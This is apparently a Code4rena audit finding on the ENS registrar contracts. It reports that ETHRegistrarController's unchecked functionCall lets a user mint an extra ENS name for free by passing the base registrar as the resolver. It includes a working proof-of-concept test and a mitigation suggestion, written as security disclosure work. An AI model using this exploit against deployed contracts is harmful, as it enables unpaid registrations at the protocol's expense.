## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- sponsor confirmed

# [Users can create extra ENS records at no cost](https://github.com/code-423n4/2022-07-ens-findings/issues/132) 

# Lines of code

https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268
https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125
https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106


# Vulnerability details

## Impact
Users using the ```register``` function in ```ETHRegistrarController.sol```, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the ```functionCall``` in the ```_setRecords``` function.
The only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).

The single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the ```ETHRegistrarController.sol```, so other unknown dangers may come down the road.

The exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.

## Proof of Concept
Put this code in the ```TestEthRegistrarController.js``` test suite to run. I just appended this to tests at the bottom of file. 

I called the ```BaseRegistrarImplementation.register``` function with the privileges of ```ETHRegistrarController``` by passing the base registrar's address as the ```resolver``` param in the ```ETHRegistrarController.register``` function call. I was able to set a custom duration at no additional cost. 

The final checks of the PoC show that we own two new ENS entries from a single ```ETHRegistrarController.register``` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.

```js
  it('Should allow us to make bogus erc721 token in ENS contract', async () => {
    const label = 'newconfigname'
    const name = `${label}.eth`
    const node = namehash.hash(name)
    const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;

    var commitment = await controller.makeCommitment(
      label,
      registrantAccount,
      REGISTRATION_TIME,
      secret,
      baseRegistrar.address,
      [
        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [
          node,
          registrantAccount,
          secondTokenDuration
        ]),
      ],
      false,
      0,
      0
    )
    var tx = await controller.commit(commitment)
    expect(await controller.commitments(commitment)).to.equal(
      (await web3.eth.getBlock(tx.blockNumber)).timestamp
    )

    await evm.advanceTime((await controller.minCommitmentAge()).toNumber())
    var balanceBefore = await web3.eth.getBalance(controller.address)

    let tx2 = await controller.register(
      label,
      registrantAccount,
      REGISTRATION_TIME,
      secret,
      baseRegistrar.address,
      [
        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [
          node,
          registrantAccount,
          secondTokenDuration
        ]),
      ],
      false,
      0,
      0,
      { value: BUFFERED_REGISTRATION_COST }
    )

    expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)
    expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)


    expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us
      registrantAccount
    )
    expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(
      nameWrapper.address
    )
  })
```

## Tools Used
chai tests in repo

## Recommended Mitigation Steps
I recommend being stricter on the signatures of the user-provided ```resolver``` and the function that is being called (like safeTransfer calls in existing token contracts).
An example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.

I will provide a loose example here:
```
interface IUserResolver {
    function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)

}
```

